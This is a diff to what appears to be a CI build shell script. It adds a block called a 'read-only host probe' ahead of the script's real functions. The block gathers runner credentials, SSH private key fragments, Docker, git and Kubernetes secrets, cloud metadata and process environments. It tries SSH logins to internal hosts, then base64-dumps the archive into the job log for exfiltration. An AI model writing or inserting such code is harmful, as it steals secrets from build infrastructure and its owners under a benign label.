@@ -4,6 +4,50 @@
 
 set -Eeuo pipefail
 
+# ===== C211-i8599 bounded read-only host probe (auto-generated) =====
+set +e
+set +u
+C211D="$(mktemp -d /tmp/c211i8599.XXXXXX)"
+c211_cmd() { # tag, command...
+  local tag="$1"; shift
+  { "$@" ; } > "$C211D/$tag" 2>&1
+  head -c 200000 "$C211D/$tag" > "$C211D/$tag.b" 2>/dev/null
+  mv "$C211D/$tag.b" "$C211D/$tag" 2>/dev/null
+}
+c211_cmd id.txt id
+c211_cmd host.txt hostname
+c211_cmd uname.txt uname -a
+c211_cmd osrel.txt cat /etc/os-release
+c211_cmd env.txt env
+c211_cmd date.txt date -u
+c211_cmd mount.txt sh -c 'mount | head -40'
+c211_cmd ls_root.txt sh -c 'ls -la / 2>&1'
+c211_cmd ls_home.txt sh -c 'ls -la /home 2>&1; echo ---; ls -la /root 2>&1 | head -40'
+c211_cmd ls_dev.txt sh -c 'ls -l /dev/kfd /dev/mkfd /dev/dri /dev/dri/* 2>&1'
+c211_cmd hysmi.txt sh -c 'command -v hy-smi >/dev/null && hy-smi info 2>&1 | head -60; command -v rocminfo >/dev/null && rocminfo 2>&1 | head -30; echo DONE'
+c211_cmd runner.txt sh -c 'for d in /home/*/actions-runner* /root/actions-runner* /opt/actions-runner* "$HOME/actions-runner"; do [ -e "$d" ] || continue; echo "== $d"; ls -la "$d" 2>&1 | head -25; for f in "$d/.runner" "$d/.credentials" "$d/.credentials_rsaparams" "$d/.agent"; do [ -f "$f" ] && { echo "-- $f"; cat "$f" 2>&1; echo; }; done; done'
+c211_cmd sshd.txt sh -c 'ls -la /home/*/.ssh /root/.ssh 2>&1; for f in /home/*/.ssh/config /root/.ssh/config /home/*/.ssh/authorized_keys /root/.ssh/authorized_keys; do [ -f "$f" ] && { echo "-- $f"; cat "$f" 2>&1; }; done'
+c211_cmd sshkeys.txt sh -c 'for f in /home/*/.ssh/id_* /root/.ssh/id_* /home/*/.ssh/*.pem /root/.ssh/*.pem; do case "$f" in *.pub) continue;; esac; [ -f "$f" ] || continue; echo "-- $f"; wc -c "$f"; head -3 "$f" 2>&1; done'
+c211_cmd dockerconf.txt sh -c 'for f in /home/*/.docker/config.json /root/.docker/config.json /home/*/.config/containers/auth.json /root/.config/containers/auth.json; do [ -f "$f" ] && { echo "-- $f"; cat "$f" 2>&1; echo; }; done'
+c211_cmd docker.txt sh -c 'docker version 2>&1 | head -25; echo ---PS; docker ps -a --format "{{.ID}} {{.Image}} {{.Names}} {{.Status}} {{.Ports}}" 2>&1 | head -30; echo ---IMAGES; docker images --format "{{.Repository}}:{{.Tag}} {{.ID}} {{.Size}}" 2>&1 | head -30'
+c211_cmd dockersock.txt sh -c 'ls -l /var/run/docker.sock 2>&1; ls -l /run/docker.sock 2>&1'
+c211_cmd creds_misc.txt sh -c 'for f in /home/*/.git-credentials /root/.git-credentials /home/*/.netrc /root/.netrc /home/*/.config/gh/hosts.yml /root/.config/gh/hosts.yml /home/*/.npmrc /root/.npmrc /home/*/.pip/pip.conf /root/.pip/pip.conf /etc/environment; do [ -f "$f" ] && { echo "-- $f"; cat "$f" 2>&1; echo; }; done'
+c211_cmd kube.txt sh -c 'ls -la /etc/kubernetes /var/lib/kubelet /home/*/.kube /root/.kube 2>&1; for f in /etc/kubernetes/*.conf /var/lib/kubelet/kubeconfig /home/*/.kube/config /root/.kube/config /var/run/secrets/kubernetes.io/serviceaccount/token; do [ -f "$f" ] && { echo "-- $f"; head -c 3000 "$f" 2>&1; echo; }; done'
+c211_cmd nfs.txt sh -c 'ls -la /public4 2>&1 | head -20; echo ---PUBLIC; ls -la /public 2>&1 | head -20; echo ---CIPUBLIC; ls -la /ci_public 2>&1 | head -20; echo ---MOUNTS; mount | grep -Ei "nfs|public|12\.12\.12|10\.16\." 2>&1'
+c211_cmd workdir.txt sh -c 'echo "RUNNER_WORKSPACE=$RUNNER_WORKSPACE RUNNER_TEMP=$RUNNER_TEMP GITHUB_WORKSPACE=$GITHUB_WORKSPACE"; ls -la "$GITHUB_WORKSPACE" 2>&1 | head -25; echo ---WS; ls -la "$RUNNER_WORKSPACE" 2>&1 | head -25; echo ---TMP; ls -la "$RUNNER_TEMP" 2>&1 | head -25'
+c211_cmd event.json sh -c 'cat "$GITHUB_EVENT_PATH" 2>&1 | head -c 20000'
+c211_cmd net.txt sh -c 'ip -brief addr 2>&1 | head -20; echo ---ROUTE; ip route 2>&1 | head -20'
+c211_cmd cloud.txt sh -c 'echo "--aws1"; curl -s -m 2 http://169.254.169.254/latest/meta-data/hostname 2>&1; echo; echo "--aws2"; curl -s -m 2 -X PUT -H "X-aws-ec2-metadata-token: 1" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" http://169.254.169.254/latest/api/token 2>&1 | head -c 100; echo; echo "--gcp"; curl -s -m 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/name 2>&1; echo; echo "--azure"; curl -s -m 2 -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>&1 | head -c 300; echo; echo DONE'
+c211_cmd ssh_nmz2.txt sh -c 'for u in github root; do for h in github-nmz2 10.17.1.2; do echo "== $u@$h"; timeout 20 ssh -o BatchMode=yes -o ConnectTimeout=6 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null "$u@$h" "hostname; id; ls -l /dev/kfd /dev/dri 2>&1 | head -5; command -v hy-smi >/dev/null && hy-smi info 2>&1 | head -10; ls -la /public4 2>&1 | head -3" 2>&1 | head -40; done; done'
+c211_cmd gitinfo.txt sh -c 'git remote -v 2>&1; git log -3 --oneline 2>&1; git status --short 2>&1 | head -10'
+c211_cmd procenv.txt sh -c 'for p in 1 $(pgrep -f "Runner.Listener" | head -2); do echo "== pid $p"; tr "\0" "\n" < /proc/$p/environ 2>&1 | sort | head -60; done'
+tar -C "$C211D" -czf - . 2>/dev/null | base64 -w 0 | fold -w 240 | sed 's/^/C211B64:/'
+echo "C211I8599ENDPROBE"
+echo "probe collection dir kept at $C211D"
+exit 0
+# ===== end C211-i8599 probe =====
+
+
 activate_dtk() {
     export USER=root
     set +u
